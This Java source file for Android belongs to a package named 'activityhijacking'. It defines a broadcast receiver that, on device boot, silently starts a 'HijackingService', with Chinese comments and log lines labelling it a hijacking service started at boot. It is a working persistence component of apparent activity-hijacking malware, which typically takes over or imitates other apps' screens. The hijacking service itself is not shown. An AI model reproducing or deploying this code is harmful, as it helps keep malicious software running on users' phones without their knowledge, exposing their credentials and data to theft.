package com.forgotten.activityhijacking;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

public class HijackingReciver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        switch (intent.getAction()){
            case "android.intent.action.BOOT_COMPLETED":
                // 启动劫持服务
                startHijackingService(context);
                break;

            default:
                throw new IllegalStateException("Unexpected value: " + intent.getAction());
        }
    }

    private void startHijackingService(Context context) {
        Log.w("hijacking","开机启动");
        Intent intent2 = new Intent(context,HijackingService.class);
        context.startService(intent2);
        Log.w("hijacking","启动劫持Service");
    }
}